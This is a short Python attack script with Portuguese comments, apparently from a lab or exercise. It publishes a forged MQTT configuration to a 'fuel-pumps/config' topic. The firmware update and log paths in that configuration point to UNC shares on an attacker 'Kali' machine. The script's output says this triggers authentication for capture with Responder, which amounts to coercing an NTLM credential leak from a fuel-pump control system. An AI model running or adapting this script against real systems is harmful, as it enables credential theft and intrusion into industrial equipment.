import json
import paho.mqtt.client as mqtt

BROKER = "10.10.100.100"
KALI_IP = "10.10.100.8" 

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.connect(BROKER, 1883, 60)

# Exemplo de payload induzindo o sistema a carregar algo de um caminho de rede (UNC)
payload = {
    "pumpId": "PUMP001",
    "firmware_update_url": f"\\\\{KALI_IP}\\share\\update.bin",
    "log_path": f"\\\\{KALI_IP}\\logs"
}

# O tópico exato depende de qual variável o sistema lê para processar caminhos
client.publish("fuel-pumps/config", json.dumps(payload))
print("[+] Gatilho de autenticação enviado. Verifique o terminal do Responder!")
client.disconnect()
